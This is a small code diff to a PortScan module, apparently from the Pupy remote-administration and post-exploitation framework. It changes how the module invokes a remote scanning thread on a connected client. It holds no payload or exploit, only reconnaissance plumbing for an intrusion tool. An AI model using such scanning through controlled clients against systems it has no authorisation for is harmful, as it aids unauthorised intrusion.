@@ -47,7 +47,7 @@ class PortScan(PupyModule):
         ports = list(set(ports))
         random.shuffle(ports)
 
-        scanner = self.client.conn.modules['network.lib.scan']
+        scanthread = self.client.remote('network.lib.scan', 'scanthread', False)
 
         def set_connectable(addrs):
             self.connectable = addrs
@@ -55,8 +55,9 @@ class PortScan(PupyModule):
 
         self.connectable = []
 
-        self.abort = scanner.scanthread(
-            hosts, ports, set_connectable, timeout=args.timeout, portion=args.portion
+        self.abort = scanthread(
+            hosts, ports, set_connectable,
+            timeout=args.timeout, portion=args.portion
         )
 
         self.terminated.wait()
